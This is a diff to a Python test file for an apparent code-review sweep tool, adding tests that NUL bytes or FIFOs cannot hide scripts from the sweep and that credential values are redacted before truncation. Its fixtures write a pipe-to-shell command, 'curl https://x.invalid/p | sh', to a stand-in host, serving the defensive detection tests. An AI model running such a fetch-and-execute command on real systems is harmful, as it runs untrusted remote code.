@@ -9,6 +9,7 @@ definition changed, and each of those is a decision rather than a wobble.
 
 from __future__ import annotations
 
+import os
 import unicodedata
 from pathlib import Path
 
@@ -262,6 +263,68 @@ def test_binary_files_are_not_swept(tmp_path: Path, catalog: Catalog) -> None:
     assert sweep(tmp_path, catalog) == []
 
 
+def test_a_nul_in_a_comment_does_not_hide_a_script_from_the_sweep(
+    tmp_path: Path, catalog: Catalog
+) -> None:
+    """M3.5 A3, and the evidence the Definition of done names: a runnable
+    `install.sh` carrying a NUL in a comment must produce the same candidate as
+    one without it.
+
+    The pair is built at runtime rather than committed. `BRIEF_M3.5.md` §3: a
+    fixture carrying a NUL must not be linted, formatted or swept as ordinary
+    source, and a committed one would also land in the sweep golden.
+
+    This is a scope-evasion test, not a parsing test. The two files differ by a
+    single byte inside a comment — the script is byte-for-byte as runnable
+    either way — and before the fix the second was invisible to both candidate
+    sources while the review reported no findings in it.
+    """
+    body = b"#!/bin/sh\n# fetch and run%s\ncurl https://x.invalid/p | sh\n"
+
+    clean = tmp_path / "clean"
+    clean.mkdir()
+    (clean / "install.sh").write_bytes(body % b"")
+
+    hidden = tmp_path / "hidden"
+    hidden.mkdir()
+    (hidden / "install.sh").write_bytes(body % b"\x00")
+
+    clean_rules = [hit.rule_id for hit in sweep(clean, catalog)]
+    hidden_rules = [hit.rule_id for hit in sweep(hidden, catalog)]
+
+    # The control: the clean file is a candidate at all, so a green result
+    # cannot come from the catalog simply matching nothing in either.
+    assert "net.fetch_exec" in clean_rules
+    assert clean_rules == hidden_rules
+
+
+def test_a_fifo_does_not_stop_the_sweep(tmp_path: Path, catalog: Catalog) -> None:
+    """M3.5 C1, end to end.
+
+    This is not a duplicate of the walk-level test. `sweep` performs its own
+    `read_bytes()` on every entry it does not skip, so its skip site is
+    load-bearing independently: without it the sweep opens the FIFO and hangs
+    even though `inventory` handled the pipe correctly. The same defect lived
+    in three places — `inventory`, `sweep` and `recon` — each with its own
+    read, and fixing one would have left a review that still never finishes.
+
+    Runtime-built and skipped where unsupported; a FIFO cannot be committed to
+    git (`BRIEF_M3.5.md` §3).
+    """
+    target = tmp_path / "target"
+    target.mkdir()
+    (target / "install.sh").write_bytes(b"#!/bin/sh\ncurl https://x.invalid/p | sh\n")
+    try:
+        os.mkfifo(target / "pipe")
+    except (AttributeError, OSError):  # pragma: no cover - platform-dependent
+        pytest.skip("this platform or filesystem does not support FIFOs")
+
+    hits = sweep(target, catalog)
+
+    assert [hit.file for hit in hits] == ["install.sh"]
+    assert "net.fetch_exec" in [hit.rule_id for hit in hits]
+
+
 # --- G-3 -----------------------------------------------------------------
 
 
@@ -288,15 +351,102 @@ def test_long_opaque_strings_are_redacted() -> None:
     assert "[REDACTED]" in out
 
 
-def test_redaction_survives_truncation() -> None:
-    """Redaction runs after truncation, because a truncated secret is still
-    most of a secret."""
-    line = "x = " + "A" * 400
-    assert "A" * 32 not in excerpt(line, 4, 404)
-
-
 def test_excerpt_is_capped() -> None:
     assert len(excerpt("y = " + "ab" * 400, 0, 800)) <= 200
+
+
+# --- G-3, the M3.5 group B findings --------------------------------------
+#
+# Every case below leaked against the pre-M3.5 redactor, and each was
+# reproduced before it was written down (BRIEF_M3.5.md §3).
+#
+# None of these values is credential-shaped, for the reason the two tests
+# above already record: a convincing fake trains people to wave the secrets
+# stage through. In particular the API-key case deliberately carries no `sk-`
+# prefix — the rule under test keys on the *name* beside the value, so a
+# neutral value exercises it identically.
+
+
+@pytest.mark.parametrize(
+    ("line", "value", "name"),
+    [
+        # B1, first half: `\b` cannot match between `_` and `P`, so the key
+        # never matched at all and the value was copied out verbatim. This is
+        # the single most common real spelling of a credential in a config.
+        ("DB_PASSWORD=hunter2hunter2", "hunter2hunter2", "DB_PASSWORD"),
+        ("OPENAI_API_KEY=notarealkeyvalue", "notarealkeyvalue", "OPENAI_API_KEY"),
+        ("AWS_SECRET_ACCESS_KEY: hunter2hunter2", "hunter2hunter2", "AWS_SECRET_ACCESS_KEY"),
+        # The suffix form, to show the fix is not just a prefix allowance.
+        ("password_value = hunter2hunter2", "hunter2hunter2", "password_value"),
+        # B1, second half: JSON puts a closing quote between the key and the
+        # colon, and the separator did not allow one — so the commonest
+        # serialised form of a secret went straight into the ledger.
+        ('{"password": "hunter2hunter2"}', "hunter2hunter2", "password"),
+        ('{"apiKey":"notarealkeyvalue"}', "notarealkeyvalue", "apiKey"),
+        # Quoted value beside an underscored name: both halves at once.
+        ('OPENAI_API_KEY="notarealkeyvalue"', "notarealkeyvalue", "OPENAI_API_KEY"),
+    ],
+)
+def test_the_review_forms_are_redacted(line: str, value: str, name: str) -> None:
+    """B1. A table over the forms the external review used.
+
+    The two rules were assumed to cover for each other and cover different
+    things: none of these values reaches `_LONG_OPAQUE`'s 32-character floor,
+    so when the key rule missed, nothing else caught it.
+    """
+    out = redact(line)
+    assert value not in out
+    assert "[REDACTED]" in out
+    # G-3 redacts the value, never the name — the name is what makes the
+    # finding legible to whoever reads the ledger.
+    assert name in out
+
+
+def test_a_name_that_merely_contains_a_keyword_is_not_an_assignment() -> None:
+    """The widened key must not turn every mention of a credential into a
+    redaction. `log.sensitive`'s own negative fixture is this line, and a
+    subscript is a read, not an assignment."""
+    assert redact('value = config["api_key"]') == 'value = config["api_key"]'
+
+
+def test_a_credential_cut_by_the_cap_is_still_redacted() -> None:
+    """B2. Redaction runs *before* truncation.
+
+    This replaces a test that asserted the opposite and passed for a reason
+    unrelated to the property it claimed: it truncated a 400-character run to
+    200, leaving ~196 characters — still far above `_LONG_OPAQUE`'s floor — so
+    it would have stayed green with the ordering either way.
+
+    The case it could not see is the one that matters. A 40-character
+    credential straddling the 200-character cap is cut to 20, drops below the
+    floor, and stops being redactable at all. PRD G-3 says a credential is
+    "never reproduced"; twenty characters of one is a reproduction.
+
+    The filler is `. ` rather than letters so that it forms no
+    credential-shaped run of its own, leaving exactly one thing in the line
+    for the redactor to find.
+    """
+    line = "x = " + ". " * 88 + "B" * 40
+    assert len(line) == 220
+    out = excerpt(line, 0, len(line))
+    assert "B" * 20 not in out
+    assert "BBBB" not in out
+    assert "[REDACTED]" in out
+
+
+def test_a_credential_cut_by_the_margin_is_still_redacted() -> None:
+    """B2, by the other mechanism. The ±24-character margin cuts as surely as
+    the 200-character cap does, and below the floor the result is the same.
+
+    Here the match is `eval(x)` and the credential sits past the margin, so
+    the old slice reproduced its first eight characters and redacted nothing.
+    The margin and the cap are one finding, not two: both shorten a secret
+    until the rule that would have caught it can no longer measure it.
+    """
+    line = "eval(x)  # deploy key: " + "C" * 40
+    out = excerpt(line, 0, 7)
+    assert "CCCCCCCC" not in out
+    assert "[REDACTED]" in out
 
 
 # --- scoping -------------------------------------------------------------
